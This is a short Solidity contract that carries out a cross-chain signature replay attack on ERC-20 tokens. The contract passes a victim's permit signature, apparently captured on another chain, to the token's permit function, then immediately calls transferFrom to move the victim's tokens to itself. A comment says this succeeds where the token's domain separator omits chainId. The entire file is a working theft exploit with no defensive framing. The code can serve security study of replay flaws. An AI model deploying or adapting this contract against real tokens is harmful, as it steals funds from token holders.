
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Victim signed this message on chain A:
// permit(owner, spender, value, deadline, v, r, s)
interface IERC20Permit {
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract PermitReplay {
    function replay(
        IERC20Permit token,
        address victim,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        // Replay the signature captured from another chain.
        // If the domain separator lacks chainId, this succeeds.
        token.permit(victim, address(this), value, deadline, v, r, s);
        token.transferFrom(victim, address(this), value);
    }
}
